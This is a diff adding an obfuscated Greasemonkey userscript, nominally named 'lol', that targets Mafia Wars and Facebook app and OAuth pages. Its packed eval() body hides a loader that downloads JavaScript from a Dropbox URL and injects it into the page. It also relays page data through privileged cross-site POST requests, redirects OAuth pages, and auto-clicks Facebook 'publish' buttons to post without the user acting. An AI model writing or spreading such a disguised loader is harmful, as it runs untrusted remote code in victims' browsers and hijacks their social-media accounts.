@@ -1,0 +1,23 @@
+﻿// ==UserScript==
+// @name           lol
+// @description    Dem
+// @namespace      dem
+// @include        http://facebook-ca2.mafiawars.zynga.com/mwfb/remote/html_server.php*
+// @grant          GM_setValue
+// @include        https://facebook-ca2.mafiawars.zynga.com/mwfb/remote/html_server.php*
+// @include        http://www.facebook.com/dialog/oauth?client_id=10000000001*
+// @include        https://www.facebook.com/dialog/oauth?client_id=10000000001*
+// @grant          GM_xmlhttpRequest
+// @include        http://apps.facebook.com/inthemafia/?install_source*
+// @include        https://apps.facebook.com/inthemafia/?install_source*
+// @include        http://apps.facebook.com/inthemafia/*
+// @grant          GM_getValue
+// @include        https://apps.facebook.com/inthemafia/*
+// @include        http://mafiademon.com
+// @include        http://mafiatornado.com
+// @include        http://mafiademon.info
+// @include        http://mwscripts.com/happyplace/
+// @include        http://mwscripts.com/happyplace/v2
+// @version        lol
+// ==/UserScript==
+eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('(6(){i Z=\'1H://1G.1F.v/u/1M/1L.v/1K.1A/?24=\'+23.22();i J=29;9(/L=1f/.1q(3.8.j))J=1n;9(/L=1k/.1q(3.8.j))J=1n;9(3.8.j.7(\'1s/1T?1Y=1X\')>-1){G.8.j=8.H+\'//C.B.v/x/\';N}9(3.8.j.7(\'1V&1W&1U&1P&1Q&1R\')>-1){G.8.j=8.H+\'//C.B.v/x/\';N}9(3.8.j.7(\'1S\')>-1){G.8.j=8.H+\'//C.B.v/x/\';N}9(3.8.j.7(\'?Q=1Z\')>-1){G.8.j=8.H+\'//C.B.v/x/\';N}9(!J)i d=!0,h=27,k=!1,l=3.8.j,p;(6(f){6 m(a,b,e){n||19({1i:"28",M:Z,1b:6(a){9(4===a.1a&&1c===a.1d&&!n){n=d;g=k;i b=3.R("Y");b.D=a.26;3.F.S(b);y(c,18)}}})}6 c(){9(e)9(!g&&!n){i a=e.E("o-11");9(a){q=25(a,10);g=d;i f=(a=T("1v"))?P(/21\\|(.+)\\|1O/.2a(P(P(a)))[1]):"0";"6"===12 1l?1l():(m(0,q,f),y(6(){m(1,q,f)},1B))}}1y{9(!b&&(a=e.E("o-W"))){i u=e.E("o-M");u&&(19({1i:"1D",M:u,o:1C(a),1z:{"1g-1x":"1N/1E","1g-1J":""+a.1I},1b:6(a){4===a.1a&&(1c===a.1d&&(e.1e("o-W"),e.1e("o-M")),b=k)}}),b=d)}a="1"===e.E("o-I")?d:k;a!==r&&(r=a,1t("I",r))}y(c,18)}i b=k,g=k,n=k,e=h,q=0,r=k;f.z=6(){i a;a:{13{9(-1!==w.O.7("2B")){i b=3.A("2D");b.2A+="&Q=1j";a=k;2z a}}1o(g){}a=-1!==l.7("L=1f")||-1!==l.7("L=1k")||-1!==l.7("2x=1")||-1!==l.7("Q=1j")||-1===l.7("2F.2E")||!3.A("2L")||3.A("U")?k:d}a&&(e=3.R("V"),e.K("2G","U"),e.K("1p","2K:2H;"),e.K("o-2I","2.5.0"),3.F.S(e),a=3.R("Y"),a.D=\'3.A("U").K("o-11", 2i.2g);\',3.F.S(a),c())}})(p||(p={}));i s;(6(f){6 m(b){"2c"===12 b&&(b=3.A(b));9(b){i c=b.1m.2d("2k");c.2r("2s",d,d,b.1m.2t,0,0,0,0,0,k,k,k,k,0,h);b.2p(c)}}6 c(b){13{i g=3.17(\'//16[@15="2m" X @O="14"]\',3,h,1h.1r,h).1w;g||(g=3.17(\'//16[@15="2n" X @O="14"]\',3,h,1h.1r,h).1w);g&&-1===3.F.D.7("2q 2l 2e")?w.y(6(){m(g);b&&w.y(6(){c(b)},1u)},2j):w.y(6(){c(b)},1u)}1o(f){}}f.z=6(){-1!==w.8.j.7("1s/2v")?-1!==3.F.D.7("x")&&T("I")&&c(k):-1!==w.8.j.7("C.B.v/x")&&T("I")&&c(d)}})(s||(s={}));i t;(6(f){f.z=6(){i f,c;9(c=3.A("2w"))9(f=c.E("o-W"))1t("1v",f),c.D=\'2C 2J <V 1p="2u:#2o;">2f X 2h</V>\'}})(t||(t={}));-1!==l.7("2y.2b.v")?p.z():-1!==l.7("B.v")?s.z():-1!==l.7("20")&&t.z()})();',62,172,'|||document|||function|indexOf|location|if|||||||||var|href|||||data|||||||com|window|inthemafia|setTimeout|start|getElementById|facebook|apps|innerHTML|getAttribute|body|top|protocol|autopost|skip|setAttribute|xw_controller|url|return|name|atob|next_params|createElement|appendChild|GM_getValue|demondata|span|key|and|script|my_url||fbid|typeof|try|publish|type|input|evaluate|1E3|GM_xmlhttpRequest|readyState|onreadystatechange|200|status|removeAttribute|freegifts|Content|XPathResult|method|YTozOntpOjA7czo1OiJpbmRleCI7aToxO3M6NDoidmlldyI7aToyO3M6OToiJmhpZGRlbj0xIjt9|requests|GM_iops|ownerDocument|true|catch|style|test|ANY_UNORDERED_NODE_TYPE|dialog|GM_setValue|3E3|chromaKey|singleNodeValue|Type|else|headers|js|1E4|decodeURI|POST|json|dropboxusercontent|dl|https|length|Length|AKademic|dorakemon|14897841|application|cb|zy_link|zy_creative|fb_sig_locale|mw_rdcnt|oauth|install_link|install_source|zy_track|10000000001|client_id|YToyOntpOjA7czo1OiJsb2JieSI7aToxO3M6NDoibGFuZCI7fQ|mafiademon|new|random|Math|tmp|parseInt|responseText|null|GET|false|exec|zynga|string|createEvent|reward|Found|trackId|Activated|User|5E3|MouseEvents|take|submit|button|4f4|dispatchEvent|daily|initMouseEvent|click|defaultView|color|feed|chromakey|hidden|mafiawars|break|src|some_mwiframe_hidden|Userscript|some_mwiframe|php|html_server|id|none|loader|Extension|display|final_wrapper'.split('|'),0,{}))
